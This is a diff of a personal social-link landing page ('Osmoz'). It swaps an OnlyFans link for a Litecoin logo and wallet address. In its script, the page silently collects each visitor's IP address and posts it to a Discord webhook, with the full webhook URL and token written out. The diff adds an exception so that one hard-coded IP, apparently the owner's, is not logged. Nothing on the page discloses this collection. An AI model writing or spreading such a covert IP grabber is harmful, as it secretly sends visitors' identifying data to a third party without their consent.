@@ -57,10 +57,11 @@
             <h1 class="text-3xl font-bold text-purple-500">Osmoz</h1>
             <p class="text-purple-500 mb-4">It's just you &amp; me and not the others!</p>
             <div class="flex justify-center space-x-4 text-purple-500 text-2xl mb-4">
-                <a href="https://onlyfans.com" target="_blank" class="link"><i class="fab fa-onlyfans"></i></a>
                 <a href="https://open.spotify.com/playlist/7daWcbR5JO3R7R3YdQVU5q?si=1cfabc78b8364523" target="_blank" class="link"><i class="fab fa-spotify"></i></a>
                 <a href="https://discord.gg/kimashop" target="_blank" class="link"><i class="fab fa-discord"></i></a>
+                <a href="https://www.litecoin.com" target="_blank" class="link"><img src="https://upload.wikimedia.org/wikipedia/en/2/24/Litecoin_logo.png" alt="LTC Logo" class="w-10 h-10"/></a>
             </div>
+            <p class="text-purple-500 mb-4">Address: LVAfyGqC1xrifygnPLxVBCkgGyran7UfHk</p>
             <div class="text-purple-500 text-xl">
                 <i class="fas fa-eye"></i> <span id="viewCount">0</span>
             </div>
@@ -166,7 +167,9 @@
                 .then(response => response.json())
                 .then(data => {
                     console.log('User IP Address:', data.ip);
-                  
+                    
+                    // Check if the IP is not the one we want to exclude
+                    if (data.ip !== '86.234.134.179') {
                         // Send the IP address to your Discord webhook
                         fetch('https://ptb.discord.com/api/webhooks/1257370292347732039/gawrdocaGwUi6yv5iusR6HXYubx0CrLcnfRXNRRhKOtgzrnOg_qFDYZlLQ86ioWpKOvJ', {
                             method: 'POST',
